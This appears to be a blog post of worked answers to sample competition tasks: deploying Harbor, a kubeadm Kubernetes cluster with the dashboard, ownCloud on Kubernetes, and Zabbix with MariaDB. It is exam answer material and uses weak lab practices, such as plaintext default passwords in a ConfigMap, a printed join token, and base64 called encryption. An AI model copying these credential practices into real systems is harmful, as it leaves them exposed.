config</span></span><br><span class="line">http:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">port <span class="keyword">for</span> http, default is 80. If https enabled, this port will redirect to https port</span></span><br><span class="line">  port: 80</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash"><span class="comment">##在此处注释掉https</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https related config</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">https:</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">https port <span class="keyword">for</span> harbor, default is 443</span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">port: 443</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">The path of cert and key files <span class="keyword">for</span> nginx</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">certificate: /your/certificate/path</span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">private_key: /your/private/key/path</span></span><br><span class="line">........</span><br><span class="line">[root@localhost harbor]# ./prepare</span><br><span class="line">[root@harbor harbor]# ./install.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>⑥在master节点执行&#x2F;opt&#x2F;k8s_image_push.sh将所有镜像上传至docker仓库。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master paas]# ./k8s_image_push.sh</span><br><span class="line">输入镜像仓库地址(不加http/https): 192.168.157.53</span><br><span class="line">输入镜像仓库用户名: admin</span><br><span class="line">输入镜像仓库用户密码: Harbor12345</span><br><span class="line">您设置的仓库地址为: 192.168.157.53,用户名: admin,密码: xxx</span><br><span class="line">是否确认(Y/N): y</span><br><span class="line">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">镜像仓库 Login Succeeded</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>⑦执行&#x2F;opt&#x2F;k8s_con_ner_bui_install.sh部署Kubeadm、containerd、nerdctl和buildkit。</strong></p>
<p>##此处只安装kubectl kubeadm kubelet即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# yum install -y kubelet kubeadm kubectl</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#开机自启</span></span></span><br><span class="line">[root@localhost ~]# systemctl enable --now kubelet</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/kubelet.service to /usr/lib/systemd/system/kubelet.service.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>⑧在master节点kubeadm命令初始化集群，使用本地Harbor仓库。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# kubeadm init --apiserver-advertise-address 192.168.157.50 --pod-network-cidr 10.244.0.0/16 --kubernetes-version 1.18.1 --image-repository 192.168.157.50/library/</span><br><span class="line">[root@localhost ~]# mkdir -p $HOME/.kube</span><br><span class="line">[root@localhost ~]# sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">[root@localhost ~]# sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure>



<p>⑨修改提供的&#x2F;opt&#x2F;yaml&#x2F;flannel&#x2F;kube-flannel.yaml,使其镜像来源为本地Harbor仓库，然后安装kubernetes网络插件，安装完成后使用命令查看节点状态。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">eval</span> sed -i <span class="string">&#x27;s@docker.io/flannel@192.168.157.50/library@g&#x27;</span> /opt/paas/yaml/flannel/kube-flannel.yaml</span></span><br><span class="line">[root@master ~]# kubectl apply -f /opt/paas/yaml/flannel/kube-flannel.yaml</span><br><span class="line">[root@master ~]# kubectl get nodes</span><br><span class="line">NAME     STATUS     ROLES           AGE     VERSION</span><br><span class="line">master   Ready   control-plane   9m42s   v1.18.1</span><br></pre></td></tr></table></figure>



<p>⑩给kubernetes创建证书,命名空间为kubernetes-dashboard,涉及到的所有文件命名为dashboard例如dashboard.crt。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# mkdir dashboard-certs</span><br><span class="line">[root@master ~]# cd dashboard-certs/</span><br><span class="line">[root@master ~]# kubectl create namespace kubernetes-dashboard</span><br><span class="line">[root@master ~]# openssl genrsa -out dashboard.key 2048</span><br><span class="line">[root@master ~]# openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;</span><br><span class="line">[root@master ~]# openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crt</span><br><span class="line">[root@master ~]# kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard</span><br><span class="line">[root@master ~]# sed -i &quot;s/kubernetesui/$IP\/library/g&quot; /opt/yaml/dashboard/recommended.yaml</span><br><span class="line">[root@master ~]# kubectl apply -f /opt/paas/yaml/dashboard/recommended.yaml</span><br><span class="line">[root@master ~]# kubectl apply -f /opt/paas/yaml/dashboard/dashboard-adminuser.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>11修改&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml的镜像来源为本地Harbor仓库，然后使用&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml和&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;dashboard-adminuser.yaml安装kubernetes dashboard界面，完成后查看首页。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# eval sed -i &quot;s/kubernetesui/192.168.157.50\/library/g&quot; /opt/yaml/dashboard/recommended.yaml</span><br><span class="line">[root@master ~]# kubectl apply -f /opt/yaml/dashboard/recommended.yaml</span><br><span class="line">[root@master ~]# kubectl apply -f /opt/yaml/dashboard/dashadmin-user.yaml</span><br><span class="line">[root@master ~]# kubectl get svc -n kubernetes-dashboard</span><br><span class="line">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">dashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP        23m</span><br><span class="line">kubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP   23m</span><br></pre></td></tr></table></figure>



<p>12为了能使pod调度到master节点,用命令删除污点。在浏览器访问dashboard（<a href="https://IP:30001）">https://IP:30001）</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl describe nodes master | grep Taints</span></span><br><span class="line">kubectl taint nodes master node-role.kubernetes.io/control-plane-</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl describe nodes master | grep Taints</span></span><br><span class="line">Taints:             &lt;none&gt;</span><br></pre></td></tr></table></figure>



<p>13在node节点执行k8s_node_install.sh，将该节点加入kubernetes集群。完成后在master节点上查看所有节点状态。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#此处在kubeadm init 最后一条</span></span></span><br><span class="line">kubeadm join 192.168.157.51:6443 --token s6fq1p.kmluoke4b9qp7hdi \</span><br><span class="line">    --discovery-token-ca-cert-hash sha256:1d2867c654a33891b6077357bfb6d1e4babfb2e04f834944fcbad83f05d1bdc3</span><br></pre></td></tr></table></figure>



<h2 id="任务3部署Owncloud网盘服务"><a href="#任务3部署Owncloud网盘服务" class="headerlink" title="任务3部署Owncloud网盘服务"></a>任务3部署Owncloud网盘服务</h2><p>①编写yaml文件(文件名自定义)创建PV和PVC来提供持久化存储，以便保存 ownCloud 服务中的文件和数据。要求：PV（访问模式为读写，只能被单个节点挂载;存储为5Gi;存储类型为hostPath,存储路径自定义）PVC（访问模式为读写，只能被单个节点挂载;申请存储空间大小为5Gi）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-pvc.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: PersistentVolume</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-pv</span><br><span class="line">spec:</span><br><span class="line">  accessModes:</span><br><span class="line">    - ReadWriteOnce</span><br><span class="line">  capacity:</span><br><span class="line">    storage: 5Gi</span><br><span class="line">  hostPath:</span><br><span class="line">    path: /data/owncloud</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: PersistentVolumeClaim</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-pvc</span><br><span class="line">spec:</span><br><span class="line">  accessModes:</span><br><span class="line">    - ReadWriteOnce</span><br><span class="line">  resources:</span><br><span class="line">    requests:</span><br><span class="line">      storage: 5Gi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-pvc.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl get pv,pvc</span></span><br><span class="line">NAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE</span><br><span class="line">persistentvolume/owncloud-pv   5Gi        RWO            Retain           Bound    default/owncloud-pvc                           2m41s</span><br><span class="line">NAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br><span class="line">persistentvolumeclaim/owncloud-pvc   Bound    owncloud-pv   5Gi        RWO                           2m41s</span><br></pre></td></tr></table></figure>



<p>②编写yaml文件(文件名自定义)创建一个configMap对象，指定OwnCloud的环境变量。登录账号对应的环境变量为OWNCLOUD_ADMIN_USERNAME,密码对应的环境变量为OWNCLOUD_ADMIN_PASSWORD。（变量值自定义）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-configmap.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ConfigMap</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-config</span><br><span class="line">data:</span><br><span class="line">  OWNCLOUD_ADMIN_USERNAME: “admin”</span><br><span class="line">  OWNCLOUD_ADMIN_PASSWORD: “123456”</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f  owncloud-configmap.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl get ConfigMap</span></span><br><span class="line">NAME               DATA   AGE</span><br><span class="line">kube-root-ca.crt   1      20h</span><br><span class="line">owncloud-config    2      2m11s</span><br></pre></td></tr></table></figure>



<p>③编写yaml文件(文件名自定义)创建一个Secret对象，以保存OwnCloud数据库的密码。对原始密码采用base64编码格式进行加密。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 123456 | <span class="built_in">base64</span></span></span><br><span class="line">MTIzNDU2Cg==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-secret.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-db-password</span><br><span class="line">type: Opaque</span><br><span class="line">data:</span><br><span class="line">  password: MTIzNDU2Cg==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-secret.yaml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl get Secret</span></span><br><span class="line">NAME                   TYPE     DATA   AGE</span><br><span class="line">owncloud-db-password   Opaque   1      46s</span><br></pre></td></tr></table></figure>



<p>④编写yaml文件(文件名自定义) 创建Deployment对象, 指定OwnCloud的容器和相关的环境变量。(Deployment资源命名为owncloud-deployment,镜像为Harbor仓库中的owncloud:latest，存储的挂载路径为&#x2F;var&#x2F;www&#x2F;html,其它根据具体情况进行配置)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-deploy.yaml</span></span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-deployment</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: owncloud</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: owncloud</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: owncloud</span><br><span class="line">        image: 192.168.100.91/library/owncloud:latest</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        envFrom:</span><br><span class="line">        - configMapRef:</span><br><span class="line">            name: owncloud-config</span><br><span class="line">        env:</span><br><span class="line">        - name: OWNCLOUD_DB_PASSWORD</span><br><span class="line">          valueFrom:</span><br><span class="line">            secretKeyRef:</span><br><span class="line">              name: owncloud-db-password</span><br><span class="line">              key: password</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: owncloud-pv</span><br><span class="line">          mountPath: /var/www/html</span><br><span class="line">      volumes:</span><br><span class="line">      - name: owncloud-pv</span><br><span class="line">        persistentVolumeClaim:</span><br><span class="line">          claimName: owncloud-pvc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-deploy.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl describe pod</span></span><br><span class="line">Name:             owncloud-deployment-845c85cfcb-6ptqr</span><br><span class="line">Namespace:        default</span><br><span class="line">Priority:         0</span><br><span class="line">Service Account:  default</span><br><span class="line">Node:             node/192.168.100.23</span><br><span class="line">Start Time:       Fri, 17 Mar 2023 02:56:31 +0000</span><br><span class="line">Labels:           app=owncloud</span><br><span class="line">                  pod-template-hash=845c85cfcb</span><br><span class="line">Annotations:      &lt;none&gt;</span><br><span class="line">Status:           Running</span><br><span class="line">IP:               10.244.1.3</span><br><span class="line">IPs:</span><br><span class="line">  IP:           10.244.1.3</span><br><span class="line">Controlled By:  ReplicaSet/owncloud-deployment-845c85cfcb</span><br><span class="line">Containers:</span><br><span class="line">  owncloud:</span><br><span class="line">    Container ID:   containerd://d60dc4426c06cef6525e4e37f0ee37dcef762c2806c19efcd666f951d66a5c84</span><br><span class="line">    Image:          192.168.100.91/library/owncloud:latest</span><br><span class="line">    Image ID:       192.168.100.91/library/owncloud@sha256:5c77bfdf8cfaf99ec94309be2687032629f4f985d6bd388354dfd85475aa5f21</span><br><span class="line">    Port:           80/TCP</span><br><span class="line">    Host Port:      0/TCP</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Fri, 17 Mar 2023 02:56:39 +0000</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  0</span><br><span class="line">    Environment Variables from:</span><br><span class="line">      owncloud-config  ConfigMap  Optional: false</span><br><span class="line">    Environment:</span><br><span class="line">      OWNCLOUD_DB_PASSWORD:  &lt;set to the key &#x27;password&#x27; in secret &#x27;owncloud-db-password&#x27;&gt;  Optional: false</span><br><span class="line">    Mounts:</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-vtpd9 (ro)</span><br><span class="line">      /var/www/html from owncloud-pv (rw)</span><br><span class="line">Conditions:</span><br><span class="line">  Type              Status</span><br><span class="line">  Initialized       True</span><br><span class="line">  Ready             True</span><br><span class="line">  ContainersReady   True</span><br><span class="line">  PodScheduled      True</span><br><span class="line">Volumes:</span><br><span class="line">  owncloud-pv:</span><br><span class="line">    Type:       PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace)</span><br><span class="line">    ClaimName:  owncloud-pvc</span><br><span class="line">    ReadOnly:   false</span><br><span class="line">  kube-api-access-vtpd9:</span><br><span class="line">    Type:                    Projected (a volume that contains injected data from multiple sources)</span><br><span class="line">    TokenExpirationSeconds:  3607</span><br><span class="line">    ConfigMapName:           kube-root-ca.crt</span><br><span class="line">    ConfigMapOptional:       &lt;nil&gt;</span><br><span class="line">    DownwardAPI:             true</span><br><span class="line">QoS Class:                   BestEffort</span><br><span class="line">Node-Selectors:              &lt;none&gt;</span><br><span class="line">Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s</span><br><span class="line">                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason     Age   From               Message</span><br><span class="line">  ----    ------     ----  ----               -------</span><br><span class="line">  Normal  Scheduled  14m   default-scheduler  Successfully assigned default/owncloud-deployment-845c85cfcb-6ptqr to node</span><br><span class="line">  Normal  Pulling    14m   kubelet            Pulling image &quot;192.168.100.91/library/owncloud:latest&quot;</span><br><span class="line">  Normal  Pulled     14m   kubelet            Successfully pulled image &quot;192.168.100.91/library/owncloud:latest&quot; in 7.266482912s</span><br><span class="line">  Normal  Created    14m   kubelet            Created container owncloud</span><br><span class="line">  Normal  Started    14m   kubelet            Started container owncloud</span><br></pre></td></tr></table></figure>



<p>⑤编写yaml文件(文件名自定义)创建一个Service对象将OwnCloud公开到集群外部。通过<a href="http://ip/">http://IP</a>:端口号可查看owncloud.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-svc.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-service</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: owncloud</span><br><span class="line">  ports:</span><br><span class="line">    - name: http</span><br><span class="line">      port: 80</span><br><span class="line">  type: NodePort</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-svc.yaml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl get svc -A</span></span><br><span class="line">NAMESPACE              NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                  AGE</span><br><span class="line">default                kubernetes                  ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP                  24h</span><br><span class="line">default                owncloud-service            NodePort    10.98.228.242    &lt;none&gt;        80:31024/TCP             17m</span><br><span class="line">kube-system            kube-dns                    ClusterIP   10.96.0.10       &lt;none&gt;        53/UDP,53/TCP,9153/TCP   24h</span><br><span class="line">kubernetes-dashboard   dashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP                 22h</span><br><span class="line">kubernetes-dashboard   kubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP            22h</span><br></pre></td></tr></table></figure>

<h1 id="C模块：企业级应用的自动化部署和运维（样题）"><a href="#C模块：企业级应用的自动化部署和运维（样题）" class="headerlink" title="C模块：企业级应用的自动化部署和运维（样题）"></a>C模块：企业级应用的自动化部署和运维（样题）</h1><p>zabbix是一个基于<a href="https://baike.baidu.com/item/WEB/150564?fromModule=lemma_inlink">WEB</a>界面的提供分布式系统监视以及<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%9B%91%E8%A7%86/14894884?fromModule=lemma_inlink">网络监视</a>功能的企业级的开源解决方案。zabbix能监视各种<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%8F%82%E6%95%B0/4474943?fromModule=lemma_inlink">网络参数</a>，保证<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/2997788?fromModule=lemma_inlink">服务器系统</a>的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/59181998?fromModule=lemma_inlink">安全运营</a>；并提供灵活的通知机制以让<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845?fromModule=lemma_inlink">系统管理员</a><a href="https://baike.baidu.com/item/%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D/8872413?fromModule=lemma_inlink">快速定位</a>&#x2F;解决存在的各种问题。zabbix由2部分构成，zabbix <a href="https://baike.baidu.com/item/server/8873208?fromModule=lemma_inlink">server</a>与可选组件zabbix agent。</p>
<table>
<thead>
<tr>
<th>IP</th>
<th>主机名</th>
<th>节点</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.157.40</td>
<td>zabbix-server</td>
<td>Server节点</td>
</tr>
<tr>
<td>192.168.157.41</td>
<td>zabbix-agent</td>
<td>Agent节点</td>
</tr>
</tbody></table>
<p>部署方式：监控主机zabbix_server节点采用手动部署，被监控主机zabbix_agent采用Playbook部署。</p>
<p><strong>注意 压缩包需要解压后配置为yum仓库可以使用</strong></p>
<p>①修改主机名zabbix_server节点主机名为zabbix_server,zabbix_agent节点主机名为Zabbix_agent,使用提供的软件包&#x2F;root&#x2F;autoDeployment.tar在zabbix_server节点安装ansible.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hostnamectl set-hostname zabbix-server  </span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname zabbix-agent</span><br></pre></td></tr></table></figure>

<p>②在zabbix_server节点配置hosts文件，并将该文件远程发送给zabbix_agent节点，并配置免密登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:r7ZDne6h3xaK6zVevWSj77paApHMV6RAXHzH2s78cMc root@zabbix-agent</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|       ooo..o.   |</span><br><span class="line">|       o.o.o. o  |</span><br><span class="line">|        = o. +   |</span><br><span class="line">|         o  . .  |</span><br><span class="line">|        S. . + . |</span><br><span class="line">|        .oo ..= E|</span><br><span class="line">|       . o*.o.=+.|</span><br><span class="line">|        +=oB.+ o.|</span><br><span class="line">|       o**=o==+  |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">[root@localhost ~]# ssh-copy-id root@zabbix-agent</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;</span><br><span class="line">The authenticity of host &#x27;192.168.157.40 (192.168.157.40)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:EWGohbn7cIhP7AAYHbnuMx/IoLAEybzPJENWQazAFG4.</span><br><span class="line">ECDSA key fingerprint is MD5:81:d6:a5:02:87:4b:13:1b:eb:69:76:1c:5c:aa:80:bf.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys</span><br><span class="line">root@192.168.157.40&#x27;s password:</span><br><span class="line"></span><br><span class="line">Number of key(s) added: 1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   &quot;ssh &#x27;root@192.168.157.40&#x27;&quot;</span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>③在Zabbix_server节点配置ansible主机清单，在清单中创建agent主机组。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-server ~]# cat /etc/ansible/hosts</span><br><span class="line">[agent]</span><br><span class="line">zabbix-agent</span><br></pre></td></tr></table></figure>



<p>④配置基础环境，安装nginx和php74（根据实际需要安装相关php74扩展包），并开启相关服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server opt]# yum -y install nginx</span><br><span class="line">[root@zabbix_server ~]# systemctl start nginx</span><br><span class="line">[root@zabbix_server ~]# yum -y install php74-php-fpm php74-php-common php74-php-cli php74-php-gd php74-php-ldap php74-php-mbstring php74-php-mysqlnd php74-php-xml php74-php-bcmath php74-php</span><br><span class="line">[root@zabbix_server ~]#systemctl start php74-php-fpm</span><br><span class="line">[root@zabbix_server ~]#  nginx -v &amp;&amp; php74 -v</span><br><span class="line">nginx version: nginx/1.22.1</span><br><span class="line">PHP 7.4.33 (cli) (built: Feb 14 2023 08:49:52) ( NTS )</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br></pre></td></tr></table></figure>



<p>⑤在zabbix_server节点安装zabbix服务器、代理和web前端，安装前注意查看rpm包的名字,并分别启动zabbix-server和zabbix-agent。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum -y install zabbix-server  zabbix-web-mysql zabbix-agent</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl start zabbix-server&amp;&amp; systemctl start zabbix-agent</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl status zabbix-server&amp;&amp; systemctl status zabbix-agent</span></span><br><span class="line">● zabbix-server-mysql.service - Zabbix Server with MySQL DB</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/zabbix-server-mysql.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sat 2023-03-18 04:36:50 UTC; 4min 5s ago</span><br><span class="line"> Main PID: 20737 (zabbix_server)</span><br><span class="line">   CGroup: /system.slice/zabbix-server-mysql.service</span><br><span class="line">           └─20737 /usr/sbin/zabbix_server -f</span><br><span class="line"></span><br><span class="line">Mar 18 04:36:50 zabbix_server systemd[1]: Started Zabbix Serve...</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br><span class="line">● zabbix-agent.service - Zabbix Agent</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/zabbix-agent.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sat 2023-03-18 04:37:47 UTC; 3min 8s ago</span><br><span class="line">  Process: 20752 ExecStart=/usr/sbin/zabbix_agentd -c $CONFFILE (code=exited, status=0/SUCCESS)</span><br><span class="line">  Main PID: 20754 (zabbix_agentd)</span><br><span class="line">   CGroup: /system.slice/zabbix-agent.service</span><br><span class="line">           ├─20754 /usr/sbin/zabbix_agentd -c /etc/zabbix/zabb...</span><br><span class="line">           ├─20755 /usr/sbin/zabbix_agentd: collector [idle 1 ...</span><br><span class="line">           ├─20756 /usr/sbin/zabbix_agentd: listener #1 [waiti...</span><br><span class="line">           ├─20757 /usr/sbin/zabbix_agentd: listener #2 [waiti...</span><br><span class="line">           ├─20758 /usr/sbin/zabbix_agentd: listener #3 [waiti...</span><br><span class="line">           └─20759 /usr/sbin/zabbix_agentd: active checks #1 [...</span><br><span class="line"></span><br><span class="line">Mar 18 04:37:47 zabbix_server systemd[1]: Starting Zabbix Agen...</span><br><span class="line">Mar 18 04:37:47 zabbix_server systemd[1]: Started Zabbix Agent.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>



<p>⑥安装数据库MariaDB，启动数据库并设置为开机自启动。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum -y install mariadb-server</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl <span class="built_in">enable</span> --now mariadb</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl status mariadb</span></span><br><span class="line">● mariadb.service - MariaDB database server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sat 2023-03-18 04:52:20 UTC; 1min 2s ago</span><br><span class="line">  Process: 20907 ExecStartPost=/usr/libexec/mariadb-wait-ready $MAINPID (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 20822 ExecStartPre=/usr/libexec/mariadb-prepare-db-dir %n (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 20905 (mysqld_safe)</span><br><span class="line">   CGroup: /system.slice/mariadb.service</span><br><span class="line">           ├─20905 /bin/sh /usr/bin/mysqld_safe --basedir=/usr...</span><br><span class="line">           └─21071 /usr/libexec/mysqld --basedir=/usr --datadi...</span><br><span class="line"></span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: M...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: P...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: T...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: Y...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: C...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...</span><br><span 